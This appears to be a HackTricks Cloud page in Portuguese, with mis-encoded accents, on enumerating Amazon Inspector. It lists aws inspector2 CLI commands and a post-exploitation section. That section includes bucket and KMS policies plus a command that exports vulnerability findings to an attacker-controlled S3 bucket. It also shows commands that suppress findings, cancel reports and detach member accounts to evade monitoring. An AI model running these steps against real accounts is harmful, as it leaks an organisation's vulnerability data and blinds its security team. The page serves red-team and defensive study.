# AWS - Inspector Enum

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Inspector

O Amazon Inspector √© um servi√ßo avan√ßado de gerenciamento de vulnerabilidades automatizado projetado para aprimorar a seguran√ßa do seu ambiente AWS. Este servi√ßo escaneia continuamente inst√¢ncias Amazon EC2, imagens de cont√™iner no Amazon ECR, Amazon ECS e fun√ß√µes AWS Lambda em busca de vulnerabilidades e exposi√ß√£o de rede n√£o intencional. Ao aproveitar um robusto banco de dados de intelig√™ncia de vulnerabilidades, o Amazon Inspector fornece descobertas detalhadas, incluindo n√≠veis de gravidade e recomenda√ß√µes de remedia√ß√£o, ajudando as organiza√ß√µes a identificar e abordar proativamente os riscos de seguran√ßa. Esta abordagem abrangente garante uma postura de seguran√ßa fortificada em v√°rios servi√ßos AWS, auxiliando na conformidade e gerenciamento de riscos.

## Elementos-chave

### Descobertas

As descobertas no Amazon Inspector s√£o relat√≥rios detalhados sobre vulnerabilidades e exposi√ß√µes descobertas durante a varredura de inst√¢ncias EC2, reposit√≥rios ECR ou fun√ß√µes Lambda. Com base em seu estado, as descobertas s√£o categorizadas como:

- **Ativo**: A descoberta n√£o foi remediada.
- **Fechado**: A descoberta foi remediada.
- **Suprimido**: A descoberta foi marcada com este estado devido a uma ou mais **regras de supress√£o**.

As descobertas tamb√©m s√£o categorizadas nos pr√≥ximos tr√™s tipos:

- **Pacote**: Essas descobertas se referem a vulnerabilidades em pacotes de software instalados em seus recursos. Exemplos incluem bibliotecas desatualizadas ou depend√™ncias com problemas de seguran√ßa conhecidos.
- **C√≥digo**: Esta categoria inclui vulnerabilidades encontradas no c√≥digo de aplicativos em execu√ß√£o em seus recursos AWS. Problemas comuns s√£o erros de codifica√ß√£o ou pr√°ticas inseguras que podem levar a viola√ß√µes de seguran√ßa.
- **Rede**: As descobertas de rede identificam exposi√ß√µes potenciais em configura√ß√µes de rede que podem ser exploradas por atacantes. Estes incluem portas abertas, protocolos de rede inseguros e grupos de seguran√ßa mal configurados.

### Filtros e Regras de Supress√£o

Filtros e regras de supress√£o no Amazon Inspector ajudam a gerenciar e priorizar descobertas. Os filtros permitem refinar as descobertas com base em crit√©rios espec√≠ficos, como gravidade ou tipo de recurso. As regras de supress√£o permitem suprimir determinadas descobertas consideradas de baixo risco, que j√° foram mitigadas ou por qualquer outro motivo importante, evitando que sobrecarreguem seus relat√≥rios de seguran√ßa e permitindo que voc√™ se concentre em quest√µes mais cr√≠ticas.

### Lista de Materiais de Software (SBOM)

Uma Lista de Materiais de Software (SBOM) no Amazon Inspector √© uma lista de invent√°rio aninhada export√°vel detalhando todos os componentes dentro de um pacote de software, incluindo bibliotecas e depend√™ncias. As SBOMs ajudam a fornecer transpar√™ncia na cadeia de suprimentos de software, permitindo um melhor gerenciamento de vulnerabilidades e conformidade. Elas s√£o cruciais para identificar e mitigar os riscos associados a componentes de software de c√≥digo aberto e de terceiros.

## Recursos principais

### Exportar descobertas

O Amazon Inspector oferece a capacidade de exportar descobertas para Buckets Amazon S3, Amazon EventBridge e AWS Security Hub, o que permite gerar relat√≥rios detalhados de vulnerabilidades e exposi√ß√µes identificadas para an√°lise adicional ou compartilhamento em uma data e hora espec√≠ficas. Este recurso suporta v√°rios formatos de sa√≠da, como CSV e JSON, facilitando a integra√ß√£o com outras ferramentas e sistemas. A funcionalidade de exporta√ß√£o permite a personaliza√ß√£o dos dados inclu√≠dos nos relat√≥rios, permitindo filtrar descobertas com base em crit√©rios espec√≠ficos como gravidade, tipo de recurso ou intervalo de datas e incluindo por padr√£o todas as suas descobertas na Regi√£o AWS atual com status Ativo.

Ao exportar descobertas, uma chave do Servi√ßo de Gerenciamento de Chaves (KMS) √© necess√°ria para criptografar os dados durante a exporta√ß√£o. As chaves do KMS garantem que as descobertas exportadas estejam protegidas contra acesso n√£o autorizado, fornecendo uma camada extra de seguran√ßa para informa√ß√µes de vulnerabilidades sens√≠veis.

### Varredura de inst√¢ncias Amazon EC2

O Amazon Inspector oferece robustas capacidades de varredura para inst√¢ncias Amazon EC2 para detectar vulnerabilidades e problemas de seguran√ßa. O Inspector compara metadados extra√≠dos da inst√¢ncia EC2 com regras de avisos de seguran√ßa para produzir vulnerabilidades de pacote e problemas de alcance de rede. Essas varreduras podem ser realizadas por m√©todos **baseados em agente** ou **sem agente**, dependendo da configura√ß√£o de ajustes do **modo de varredura** de sua conta.

- **Baseado em Agente**: Utiliza o agente AWS Systems Manager (SSM) para realizar varreduras detalhadas. Este m√©todo permite a coleta e an√°lise abrangentes de dados diretamente da inst√¢ncia.
- **Sem Agente**: Fornece uma alternativa leve que n√£o requer a instala√ß√£o de um agente na inst√¢ncia, criando um snapshot EBS de cada volume da inst√¢ncia EC2, procurando vulnerabilidades e, em seguida, excluindo-o; aproveitando a infraestrutura AWS existente para varredura.

O modo de varredura determina qual m√©todo ser√° usado para realizar varreduras EC2:

- **Baseado em Agente**: Envolve a instala√ß√£o do agente SSM em inst√¢ncias EC2 para inspe√ß√£o profunda.
- **Varredura H√≠brida**: Combina m√©todos baseados em agente e sem agente para maximizar a cobertura e minimizar o impacto no desempenho. Nas inst√¢ncias EC2 onde o agente SSM est√° instalado, o Inspector realizar√° uma varredura baseada em agente e, nas inst√¢ncias onde n√£o h√° agente SSM, a varredura realizada ser√° sem agente.

Outro recurso importante √© a **inspe√ß√£o profunda** para inst√¢ncias Linux EC2. Este recurso oferece uma an√°lise detalhada do software e configura√ß√£o das inst√¢ncias Linux EC2, fornecendo avalia√ß√µes detalhadas de vulnerabilidades, incluindo vulnerabilidades do sistema operacional, vulnerabilidades de aplicativos e configura√ß√µes incorretas, garantindo uma avalia√ß√£o abrangente da seguran√ßa. Isso √© alcan√ßado atrav√©s da inspe√ß√£o de **caminhos personalizados** e todos os seus subdiret√≥rios. Por padr√£o, o Amazon Inspector ir√° escanear o seguinte, mas cada conta de membro pode definir at√© 5 caminhos personalizados adicionais, e cada administrador delegado at√© 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Varredura de imagens de cont√™iner ECR do Amazon

O Amazon Inspector oferece robustas capacidades de varredura para imagens de cont√™iner do Amazon Elastic Container Registry (ECR), garantindo que vulnerabilidades de pacotes sejam detectadas e gerenciadas de forma eficiente.

- **Varredura B√°sica**: Esta √© uma varredura r√°pida e leve que identifica vulnerabilidades conhecidas em pacotes do sistema operacional em imagens de cont√™iner usando um conjunto padr√£o de regras do projeto de c√≥digo aberto Clair. Com esta configura√ß√£o de varredura, seus reposit√≥rios ser√£o escaneados ao enviar ou ao realizar varreduras manuais.
- **Varredura Avan√ßada**: Esta op√ß√£o adiciona o recurso de varredura cont√≠nua al√©m da varredura ao enviar. A varredura avan√ßada mergulha mais fundo nas camadas de cada imagem de cont√™iner para identificar vulnerabilidades em pacotes do sistema operacional e em pacotes de linguagens de programa√ß√£o com maior precis√£o. Ele analisa tanto a imagem base quanto quaisquer camadas adicionais, fornecendo uma vis√£o abrangente de poss√≠veis problemas de seguran√ßa.

### Varredura de fun√ß√µes Lambda do Amazon

O Amazon Inspector inclui capacidades abrangentes de varredura para fun√ß√µes AWS Lambda e suas camadas, garantindo a seguran√ßa e integridade de aplicativos sem servidor. O Inspector oferece dois tipos de varredura para fun√ß√µes Lambda:

- **Varredura padr√£o Lambda**: Este recurso padr√£o identifica vulnerabilidades de software nas depend√™ncias do pacote de aplicativo adicionadas √† sua fun√ß√£o Lambda e camadas. Por exemplo, se sua fun√ß√£o usar uma vers√£o de uma biblioteca como python-jwt com uma vulnerabilidade conhecida, ele gera uma descoberta.
- **Varredura de c√≥digo Lambda**: Analisa o c√≥digo do aplicativo personalizado em busca de problemas de seguran√ßa, detectando vulnerabilidades como falhas de inje√ß√£o, vazamentos de dados, criptografia fraca e falta de criptografia. Ele captura trechos de c√≥digo destacando vulnerabilidades detectadas, como credenciais codificadas. As descobertas incluem sugest√µes detalhadas de remedia√ß√£o e trechos de c√≥digo para corrigir os problemas.
### **Varreduras do Center for Internet Security (CIS)**

O Amazon Inspector inclui varreduras CIS para avaliar os sistemas operacionais das inst√¢ncias Amazon EC2 em rela√ß√£o √†s recomenda√ß√µes das melhores pr√°ticas do Center for Internet Security (CIS). Essas varreduras garantem que as configura√ß√µes estejam em conformidade com os padr√µes de seguran√ßa do setor.

- **Configura√ß√£o**: As varreduras CIS avaliam se as configura√ß√µes do sistema atendem √†s recomenda√ß√µes espec√≠ficas do CIS Benchmark, sendo que cada verifica√ß√£o est√° vinculada a um ID e t√≠tulo de verifica√ß√£o CIS.
- **Execu√ß√£o**: As varreduras s√£o realizadas ou agendadas com base em tags de inst√¢ncia e cronogramas definidos.
- **Resultados**: Os resultados p√≥s-varredura indicam quais verifica√ß√µes foram aprovadas, ignoradas ou falharam, fornecendo insights sobre a postura de seguran√ßa de cada inst√¢ncia.

## Enumera√ß√£o
```bash
# Administrator and member accounts #

## List information about the AWS Inspector delegated administrator of your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 list-delegated-admin-accounts
## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## P√≥s-Explora√ß√£o

{% hint style="success" %}
Do ponto de vista de um atacante, este servi√ßo pode ajudar o atacante a encontrar vulnerabilidades e exposi√ß√µes de rede que poderiam ajud√°-lo a comprometer outras inst√¢ncias/containers.

No entanto, um atacante tamb√©m pode estar interessado em perturbar este servi√ßo para que a v√≠tima n√£o consiga ver vulnerabilidades (todas ou espec√≠ficas).
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Um atacante poderia gerar relat√≥rios detalhados de vulnerabilidades ou lista de materiais de software (SBOMs) e exfiltr√°-los do seu ambiente AWS. Essas informa√ß√µes poderiam ser exploradas para identificar fraquezas espec√≠ficas, software desatualizado ou depend√™ncias inseguras, possibilitando ataques direcionados.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
O exemplo a seguir mostra como exfiltrar todas as descobertas ativas do Amazon Inspector para um Bucket do Amazon S3 controlado pelo atacante com uma chave Amazon KMS controlada pelo atacante:

1. **Criar um Bucket do Amazon S3** e anexar uma pol√≠tica a ele para que seja acess√≠vel a partir do Amazon Inspector da v√≠tima:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Criar uma chave Amazon KMS** e anexar uma pol√≠tica a ela para que possa ser usada pelo Amazon Inspector da v√≠tima:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Execute o comando para **criar o relat√≥rio de descobertas** exfiltrando-o:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Impacto Potencial**: Gera√ß√£o e exfiltra√ß√£o de relat√≥rios detalhados de vulnerabilidades e software, obtendo insights sobre vulnerabilidades espec√≠ficas e fraquezas de seguran√ßa.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Um atacante poderia cancelar a gera√ß√£o do relat√≥rio de descobertas especificado ou do relat√≥rio SBOM, impedindo que as equipes de seguran√ßa recebam informa√ß√µes oportunas sobre vulnerabilidades e lista de materiais de software (SBOMs), atrasando a detec√ß√£o e remedia√ß√£o de problemas de seguran√ßa.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Impacto Potencial**: Disrup√ß√£o da monitoriza√ß√£o de seguran√ßa e preven√ß√£o da dete√ß√£o atempada e remedia√ß√£o de quest√µes de seguran√ßa.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Um atacante com estas permiss√µes seria capaz de manipular as regras de filtragem que determinam quais vulnerabilidades e quest√µes de seguran√ßa s√£o reportadas ou suprimidas (se a **a√ß√£o** estiver definida como SUPRIMIR, uma regra de supress√£o seria criada). Isso poderia ocultar vulnerabilidades cr√≠ticas dos administradores de seguran√ßa, facilitando a explora√ß√£o dessas fraquezas sem dete√ß√£o. Ao alterar ou remover filtros importantes, um atacante tamb√©m poderia criar ru√≠do inundando o sistema com descobertas irrelevantes, dificultando a monitoriza√ß√£o e resposta eficazes de seguran√ßa.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Impacto Potencial**: Oculta√ß√£o ou supress√£o de vulnerabilidades cr√≠ticas, ou inunda√ß√£o do sistema com descobertas irrelevantes.

### `inspector2:UpdateOrganizationConfiguration`

Um atacante com essa permiss√£o seria capaz de atualizar as configura√ß√µes para a sua organiza√ß√£o do Amazon Inspector, afetando as funcionalidades de verifica√ß√£o padr√£o habilitadas para novas contas de membros.

{% hint style="warning" %}

Esta a√ß√£o requer ser realizada pelo administrador delegado.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Impacto Potencial**: Alterar pol√≠ticas e configura√ß√µes de varredura de seguran√ßa para a organiza√ß√£o.

## `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Um atacante poderia manipular a associa√ß√£o de contas de membros dentro de uma organiza√ß√£o do Amazon Inspector. Ao associar contas n√£o autorizadas ou desassociar contas leg√≠timas, um atacante poderia controlar quais contas s√£o inclu√≠das em varreduras de seguran√ßa e relat√≥rios. Isso poderia resultar em contas cr√≠ticas sendo exclu√≠das do monitoramento de seguran√ßa, permitindo que o atacante explore vulnerabilidades nessas contas sem ser detectado.

{% hint style="warning" %}

Esta a√ß√£o requer ser realizada pelo administrador delegado.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Impacto Potencial**: Exclus√£o de contas-chave de varreduras de seguran√ßa, permitindo a explora√ß√£o n√£o detectada de vulnerabilidades.

## `inspector2:TagResource`, `inspector2:UntagResource`

Um atacante poderia manipular tags em recursos do AWS Inspector, que s√£o cr√≠ticas para organizar, rastrear e automatizar avalia√ß√µes de seguran√ßa. Ao alterar ou remover tags, um atacante poderia potencialmente ocultar vulnerabilidades de varreduras de seguran√ßa, interromper relat√≥rios de conformidade e interferir nos processos de remedia√ß√£o automatizados, levando a problemas de seguran√ßa n√£o verificados e comprometimento da integridade do sistema.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Impacto Potencial**: Oculta√ß√£o de vulnerabilidades, interrup√ß√£o de relat√≥rios de conformidade, interrup√ß√£o de automa√ß√£o de seguran√ßa e interrup√ß√£o de aloca√ß√£o de custos.

# Refer√™ncias
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>Aprenda hacking na AWS de zero a her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
